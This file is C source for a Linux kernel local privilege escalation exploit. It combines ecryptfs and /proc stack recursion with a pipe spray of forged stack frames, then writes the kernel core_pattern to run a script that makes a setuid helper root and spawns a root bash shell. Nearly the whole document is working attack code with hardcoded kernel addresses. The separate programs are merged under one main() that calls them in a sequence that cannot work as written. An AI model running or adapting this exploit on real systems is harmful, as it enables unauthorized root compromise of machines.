//gcc -o exploit exploit.c -std=gnu99 -lecryptfs -Wall -ggdb
//gcc -o suidhelper suidhelper.c -std=gnu99 -Wall -ggdb
//gcc -o hello hello.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`
/*------<exploit.c>-----*/
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdint.h>
#include <keyutils.h>
#include <errno.h>
#include <ecryptfs.h>
#include <sys/eventfd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdbool.h>
#include <assert.h>
#include <sys/wait.h>
#include <sched.h>
#include <sys/resource.h>
#include <dirent.h>

void *map_fuse_sleeper_area(int len) {
  char cmd[500];
  sprintf(cmd, "mkdir -p /tmp/fuse_mount && ./hello /tmp/fuse_mount %d", len);
  if (system(cmd))
    return NULL;
  int fuse_fd = open("/tmp/fuse_mount/hello", O_RDWR);

  void *sleeper_area = mmap(NULL, len, PROT_READ, MAP_PRIVATE, fuse_fd, 0);

  return sleeper_area;
}

void set_env_and_arg_area(char *ptr, size_t size) {
  // ensure that reading from argv works by putting a zero at the end.
  char *argv_fixup_page = (void*)((unsigned long)(ptr + size + 0xfff) & ~0xfff);
  if (mmap(argv_fixup_page, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) != argv_fixup_page)
    return;

  struct prctl_mm_map mm_map = {
    .start_code = 0x400000,
    .end_code = 0x400001,
    .start_data = 0x400002,
    .end_data = 0x400003,
    .start_brk = 0x400004,
    .brk = (uint64_t)sbrk(0),
    .start_stack = 0x100000000,
    .arg_start = (uint64_t)ptr,
    .arg_end = (uint64_t)(argv_fixup_page + 1),
    .env_start = (uint64_t)ptr,
    .env_end = (uint64_t)ptr + size,
    .auxv_size = 0,
    .exe_fd = -1
  };
  if (prctl(PR_SET_MM, PR_SET_MM_MAP, &mm_map, sizeof(mm_map), 0))
    return;
}

void write_file(char *dir, char *name, char *data) {
  char path[500];
  sprintf(path, "%s/%s", dir, name);
  int fd = open(path, O_WRONLY|O_TRUNC|O_CREAT, 0600);
  if (fd == -1)
    return;
  if (write(fd, data, strlen(data)) != strlen(data))
    return;
  close(fd);
}

size_t read_file(char *dir, char *name, char **data) {
  char path[500];
  sprintf(path, "%s/%s", dir, name);
  int fd = open(path, O_RDONLY);
  if (fd == -1)
    return -1;
  struct stat st;
  if (fstat(fd, &st))
    return -1;
  *data = malloc(st.st_size);
  if (!*data)
    return -1;
  if (read(fd, *data, st.st_size) != st.st_size)
    return -1;
  close(fd);
  return st.st_size;
}

char *mmap_file(char *path, size_t len) {
  int fd = open(path, O_RDONLY);
  if (fd == -1)
    return NULL;
  errno = 0;
  char *ptr = mmap(NULL, len, PROT_READ, MAP_PRIVATE, fd, 0);
  if (ptr == MAP_FAILED)
    return NULL;
  close(fd);
  return ptr;
}

void copy_file(char *srcdir, char *srcname, char *dstdir, char *dstname) {
  char cmd[1000];
  sprintf(cmd, "cp '%s/%s' '%s/%s'", srcdir, srcname, dstdir, dstname);
  if (system(cmd))
    return;
}

void eventfd_wait(int fd) {
  uint64_t ctr;
  ssize_t res = read(fd, &ctr, 8);
  if (res != 8)
    return ;
}

void eventfd_send(int fd) {
  uint64_t ctr = 1;
  ssize_t res = write(fd, &ctr, 8);
  if (res != 8)
    return ;
}

#define MATROSKA_DEPTH 14

pid_t children[MATROSKA_DEPTH];
int sync_eventfds_to_child[MATROSKA_DEPTH];
int sync_eventfds_from_child[MATROSKA_DEPTH];

void sendfd(int sock, int fd) {
  int len = sizeof(struct cmsghdr) + sizeof(int);
  struct cmsghdr *hdr = alloca(len);
  *hdr = (struct cmsghdr) {
    .cmsg_len = len,
    .cmsg_level = SOL_SOCKET,
    .cmsg_type = SCM_RIGHTS
  };
  *(int*)CMSG_DATA(hdr) = fd;
  struct msghdr msg = {
    .msg_control = hdr,
    .msg_controllen = len
  };
  if (sendmsg(sock, &msg, 0) < 0)
    return;
}

int recvfd(int sock) {
  int len = sizeof(struct cmsghdr) + sizeof(int);
  struct cmsghdr *hdr = alloca(len);
  struct msghdr msg = {
    .msg_control = hdr,
    .msg_controllen = len
  };
  if (recvmsg(sock, &msg, 0) < 0)
    return -1;
  if (hdr->cmsg_len != len || hdr->cmsg_level != SOL_SOCKET
      || hdr->cmsg_type != SCM_RIGHTS)
    return -1;
  return *(int*)CMSG_DATA(hdr);
}

int recurser_going_to_recurse_notifier_fd;

int recurser_main(void *dummyptr) {
  // first, set up an ecryptfs for matroska creation
  char sig[ECRYPTFS_SIG_SIZE_HEX + 1];
  char salt[ECRYPTFS_SALT_SIZE] = {0};
  if (ecryptfs_add_passphrase_key_to_keyring(sig, "foobar", salt) < 0)
    return -1;
  char ecryptfs_dir[300];
  sprintf(ecryptfs_dir, "%s/.ecryptfs", getenv("HOME"));
  if (mkdir(ecryptfs_dir, 0700) && errno != EEXIST)
    return -1;
  /* single line; no filename encryption key */
  write_file(ecryptfs_dir, "exploit.sig", sig);
  if (mkdir("/tmp/exploit_mount", 0700) && errno != EEXIST)
    return -1;
  if (mkdir("/tmp/exploit_lower", 0700) && errno != EEXIST)
    return -1;
  char conf_data[500];
  sprintf(conf_data, "/tmp/exploit_lower /tmp/exploit_mount ecryptfs none 0 0\n");
  write_file(ecryptfs_dir, "exploit.conf", conf_data);
  if (system("/sbin/mount.ecryptfs_private exploit"))
    return -1;

  // now, create the matroskas
  char MATROSKA_ZERO[50 * 1024]; /* 50KiB, should be sufficient to prevent caching */
  memset(MATROSKA_ZERO, 0x42, sizeof(MATROSKA_ZERO));
  write_file("/tmp/exploit_mount", "1", MATROSKA_ZERO);
  sync();
  for (int i=1; i<MATROSKA_DEPTH; i++) {
    char i_str[10];
    char nexti_str[10];
    sprintf(i_str, "%d", i);
    sprintf(nexti_str, "%d", i+1);
    copy_file("/tmp/exploit_lower", i_str, "/tmp/exploit_mount", nexti_str);
    sync();
  }

  // create threads
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    sync_eventfds_to_child[i] = eventfd(0, EFD_SEMAPHORE);
    if (sync_eventfds_to_child[i] == -1)
      return -1;
    sync_eventfds_from_child[i] = eventfd(0, EFD_SEMAPHORE);
    if (sync_eventfds_from_child[i] == -1)
      return -1;
  }
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    pid_t child = fork();
    if (child == -1)
      return -1;
    if (child == 0) {
      char filenumstr[10];
      sprintf(filenumstr, "%d", i+1);
      char *direct_matroska;
      size_t direct_matroska_len = read_file("/tmp/exploit_lower", filenumstr, &direct_matroska);
      set_env_and_arg_area(direct_matroska, direct_matroska_len);

      // Note: This yields control to the main process and only resumes after all the children
      // have passed this point!
      eventfd_send(sync_eventfds_from_child[i]);
      eventfd_wait(sync_eventfds_to_child[i]);

      if (i == MATROSKA_DEPTH - 1) {
        // replace memory with FUSE sleeping-pagefault area
        // note: following ecryptfs reads will return garbage
        set_env_and_arg_area(map_fuse_sleeper_area(direct_matroska_len), direct_matroska_len);
      } else {
        // map lower environ/cmdline as environ+cmdline
        char new_env_path[300];
        sprintf(new_env_path, "/tmp/exploit_mounts/%d/%s", i+1, (i < 10) ? "environ" : "cmdline");
        char *new_env = mmap_file(new_env_path, direct_matroska_len);
        set_env_and_arg_area(new_env, direct_matroska_len);
      }

      eventfd_send(sync_eventfds_from_child[i]);
      eventfd_wait(sync_eventfds_to_child[i]);

      exit(0);
    }
    eventfd_wait(sync_eventfds_from_child[i]);
    children[i] = child;
  }

  // set up mounts
  if (mkdir("/tmp/exploit_mounts", 0700) && errno != EEXIST)
    return -1;
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    char exploit_mount_subpath[300];
    sprintf(exploit_mount_subpath, "/tmp/exploit_mounts/%d", i);
    if (mkdir(exploit_mount_subpath, 0700) && errno != EEXIST)
      return -1;

    // note: the umount helper removed the key, reinsert it
    if (ecryptfs_add_passphrase_key_to_keyring(sig, "foobar", salt) < 0)
      return -1;
    sprintf(conf_data, "/proc/%d /tmp/exploit_mounts/%d ecryptfs none 0 0\n", (int)children[i], i);
    write_file(ecryptfs_dir, "exploit.conf", conf_data);
    if (system("/sbin/mount.ecryptfs_private exploit"))
      return -1;
  }

  // map lower environ
  char *top_map = mmap_file("/tmp/exploit_mounts/0/environ", sizeof(MATROSKA_ZERO));
  for (int i=0; i<MATROSKA_DEPTH; i++) {
      eventfd_send(sync_eventfds_to_child[i]);
      eventfd_wait(sync_eventfds_from_child[i]);
  }

  // puts("fault chain set up, faulting now");


  /* can't unshare on the current thread - we're multithreaded. sooo... */
  int fd_transfer_socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fd_transfer_socks))
    return -1;
  pid_t newns_child = fork();
  if (newns_child == -1)
    return -1;
  if (newns_child == 0) {
    if (unshare(CLONE_NEWUSER))
      return -1;
    int target_fd = open("/proc/self/uid_map", O_WRONLY);
    if (target_fd == -1)
      return -1;
    sendfd(fd_transfer_socks[0], target_fd);
    exit(0);
  }
  int target_fd = recvfd(fd_transfer_socks[1]);

  eventfd_send(recurser_going_to_recurse_notifier_fd);

  write(target_fd, top_map + sizeof(MATROSKA_ZERO) - 8, 8);

  // puts("still alive in original context? that's really weird. something failed.");
  return 0;
}

int pipes_per_process;

char post_corruption_user_stack[8000000];

void kernel_write(unsigned long addr, char *buf, size_t len) {
  int pipefds[2];
  if (pipe(pipefds))
    return;
  if (write(pipefds[1], buf, len) != len)
    return;
  close(pipefds[1]);
  if (read(pipefds[0], (char*)addr, len) != len)
    return;
  close(pipefds[0]);
}

char post_corruption_env_cmdline[] = "EXPLOIT POST-CORRUPTION";

void post_corruption_user_code(void) {
  int status;
  // puts("post-corruption code is alive!");

  /* kill all our children to prevent their environ/cmdline from messing up the system */
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    if (kill(children[i], SIGKILL))
      return;
    waitpid(children[i], &status, 0);
  }
  // puts("children should be dead");

  char *core_handler = "|/tmp/crash_to_root";
  kernel_write(0xffffffff81e87a60, core_handler, strlen(core_handler)+1);

  // puts("coredump handler set. recurser exiting.");
  exit(0);

  /* must not return! there is no stackframe above. */
}

unsigned long new_stack[] = {
  0xffffffff818252f2, /* return pointer of syscall handler */
  0x1515151515151515, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, /* 16 useless registers */
  (unsigned long) post_corruption_user_code, /* user RIP */
  0x33, /* user CS */
  0x246, /* EFLAGS: most importantly, turn interrupts on */
  (unsigned long) (post_corruption_user_stack + sizeof(post_corruption_user_stack)), /* user RSP */
  0x2b /* user SS */
};

void spammer(void) {
  int write_fds[pipes_per_process];

  prctl(PR_SET_PDEATHSIG, SIGKILL);

  /* first, prepare empty pipes */
  for (int i=0; i<pipes_per_process; i++) {
    int fds[2];
    if (pipe(fds))
      return;
    write_fds[i] = fds[1];
  }

  raise(SIGSTOP);

  /*
   * on SIGCONT, write data to each pipe, with the following purposes:
   *  - causing allocation of one page per pipe
   *  - marking those pages so they're recognizable in gdb
   *  - move the write pointer to the offset of the first return pointer,
   *    to avoid clobbering stuff in front of it later
   */
  char pipe_data[0xcb0] = "#~#~";
  for (int i=0; i<pipes_per_process; i++) {
    errno = 0;
    if (write(write_fds[i], pipe_data, sizeof(pipe_data)) != sizeof(pipe_data))
      return;
  }

  raise(SIGSTOP);

  /*
   * At this point, the recurser's RSP should point into one of the pipe pages.
   * Spray all of them with our new stackframe.
   */
  assert(sizeof(pipe_data) + sizeof(new_stack) < 0x1000);
  for (int i=0; i<pipes_per_process; i++) {
    errno = 0;
    if (write(write_fds[i], new_stack, sizeof(new_stack)) != sizeof(new_stack))
      return;
  }

  raise(SIGSTOP);

  exit(0);
}

char recurser_stack[8000000];

// basically `killall -9 hello`, but guaranteed to not access cmdline
void kill_all_fuse_and_helpers(void) {
  if (chdir("/proc"))
    return;
  DIR *d = opendir(".");
  if (!d)
    return;
  struct dirent *dent;
  while ((dent = readdir(d)) != NULL) {
    if (dent->d_name[0] < '0' || dent->d_name[0] > '9')
      continue;
    if (chdir(dent->d_name))
      continue;
    char comm[20];
    int comm_fd = open("comm", O_RDONLY);
    if (comm_fd == -1)
      goto back_out;
    ssize_t res = read(comm_fd, comm, 19);
    if (res < 0)
      comm[0] = 0;
    else
      comm[res] = 0;
    close(comm_fd);
    if (strstr(comm, "hello") == comm) {
      int kill_target = atoi(dent->d_name);
      // printf("killing %d\n", kill_target);
      if (kill(kill_target, SIGKILL))
        continue;
        perror("kill");
    }
back_out:
    if (chdir(".."))
      return;
  }
}

int exploit_main(void) {
  int status;

  if (system("cp suidhelper /tmp/"))
    return -1;

  write_file("/tmp", "crash_to_root", "#!/bin/bash\nchown root:root /tmp/suidhelper\nchmod 06755 /tmp/suidhelper\n");
  if (system("chmod +x /tmp/crash_to_root"))
    return -1;

  recurser_going_to_recurse_notifier_fd = eventfd(0, EFD_SEMAPHORE);
    if (recurser_going_to_recurse_notifier_fd == -1)
      return -1;

  // raise RLIMIT_NOFILE as high as we can
  struct rlimit rlim;
  if (getrlimit(RLIMIT_NOFILE, &rlim))
    return -1;
  rlim.rlim_cur = rlim.rlim_max;
  if (setrlimit(RLIMIT_NOFILE, &rlim))
    return -1;
  pipes_per_process = (rlim.rlim_max - 10) / 2;

  // prepare a bunch of children ready to spam
  int spammer_count = 300000 / pipes_per_process; /* must be well below ((/proc/sys/fs/file-max) / 2) */
  pid_t spammers[spammer_count];
  for (int i=0; i<spammer_count; i++) {
    spammers[i] = fork();
    if (spammers[i] == -1)
      return -1;
    if (spammers[i] == 0)
      spammer();
    if (waitpid(spammers[i], &status, WUNTRACED) != spammers[i])
      return -1;
  }
  // puts("all spammers ready");

  pid_t recurser_parent = fork();
  if (recurser_parent == -1)
    return -1;
  if (recurser_parent == 0) {
    raise(SIGSTOP);
    usleep(100);
    /* reduce the memory allocations for this fork as much as possible */
    int child = clone(recurser_main, recurser_stack + sizeof(recurser_stack), CLONE_FILES | CLONE_FS | CLONE_IO | CLONE_SIGHAND | CLONE_SYSVSEM | CLONE_THREAD | CLONE_VM, NULL);
    if (child == -1)
      return -1;
    syscall(__NR_exit, 0); /* not exit_group! */
  }
  if (waitpid(recurser_parent, &status, WUNTRACED) != recurser_parent)
    return -1;
  // puts("recurser parent ready");

  for (int i=0; i<spammer_count; i++) {
    kill(spammers[i], SIGCONT);
    if (i == spammer_count / 2) {
      kill(recurser_parent, SIGCONT);
    }
    if (waitpid(spammers[i], &status, WUNTRACED) != spammers[i])
      return -1;
  }
  // puts("spam over");

  eventfd_wait(recurser_going_to_recurse_notifier_fd);
  /*
   * We have time, and we really don't want to fail at this point just because we raced with
   * the recurser.
   */
  sleep(2);

  // now spray the stackframes
  // puts("writing stackframes");
  for (int i=0; i<spammer_count; i++) {
    kill(spammers[i], SIGCONT);
    if (waitpid(spammers[i], &status, WUNTRACED) != spammers[i])
      return -1;
  }
  // puts("stackframes written");

  // ... aaand resume and hope it doesn't die horribly because we missed?
  kill_all_fuse_and_helpers();

  if (getrlimit(RLIMIT_CORE, &rlim))
    return -1;
  rlim.rlim_cur = rlim.rlim_max;
  if (setrlimit(RLIMIT_CORE, &rlim))
    return -1;

  while (1) {
    int coredump_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    if (coredump_fd == -1)
      return -1;
    char buf[1000];
    ssize_t read_res = read(coredump_fd, buf, sizeof(buf)-1);
    if (read_res == -1)
      return -1;
    close(coredump_fd);
    if (strstr(buf, "|/tmp/crash_to_root") == buf)
      break;
  }
  pid_t dumper_child = fork();
  if (dumper_child == -1)
    return -1;
  if (dumper_child == 0) {
    // puts("going to crash now");
    raise(SIGSEGV);
  }

  struct stat helperstat;
  while (1) {
    if (stat("/tmp/suidhelper", &helperstat))
      return -1;
    if (helperstat.st_mode & S_ISUID)
      break;
    sleep(1);
  }
  // fputs("suid file detected, launching rootshell...\n", stderr);
  execl("/tmp/suidhelper", "suidhelper", NULL);
  return -1;
}

/*------<hello.c>-------*/
/*
  FUSE: Filesystem in Userspace
  Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>
  heavily modified by Jann Horn <jannh@google.com>

  This program can be distributed under the terms of the GNU GPL.
  See the file COPYING.

  gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello
*/

#define FUSE_USE_VERSION 26

#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>
#include <sys/uio.h>
#include <assert.h>
#include <stdlib.h>

static const char *hello_path = "/hello";

int file_size;

static int hello_getattr(const char *path, struct stat *stbuf)
{
	int res = 0;
	memset(stbuf, 0, sizeof(struct stat));
	if (strcmp(path, "/") == 0) {
		stbuf->st_mode = S_IFDIR | 0755;
		stbuf->st_nlink = 2;
	} else if (strcmp(path, hello_path) == 0) {
		stbuf->st_mode = S_IFREG | 0666;
		stbuf->st_nlink = 1;
		stbuf->st_size = file_size;
		stbuf->st_blocks = 0;
	} else
		res = -ENOENT;
	return res;
}

static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
	filler(buf, ".", NULL, 0);
	filler(buf, "..", NULL, 0);
	filler(buf, hello_path + 1, NULL, 0);
	return 0;
}

static int hello_open(const char *path, struct fuse_file_info *fi) {
	return 0;
}

static int hello_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
	/* never wake up from the pagefault until we're killed */
	while(1) pause();
	return 0; /* unreachable */
}

static struct fuse_operations hello_oper = {
	.getattr	= hello_getattr,
	.readdir	= hello_readdir,
	.open		= hello_open,
	.read		= hello_read
};

int hello_main(int argc, char *argv[]) {
	assert(argc == 3);
	file_size = atoi(argv[2]);
	argv[2] = NULL;
	return fuse_main(argc - 1, argv, &hello_oper, NULL);
}

/*-------<suidhelper.c>--------*/
#include <unistd.h>
#include <err.h>
#include <stdio.h>
#include <sys/types.h>

int suidhelper_main(void) {
	if (setuid(0) || setgid(0))
		return -1;
	fputs("we have root privs now...\n", stderr);
	execl("/bin/bash", "bash", NULL);
	return -1;
}

int main(int argc, char *argv[]){
  exploit_main();
  hello_main(argc, argv);
  suidhelper_main();
}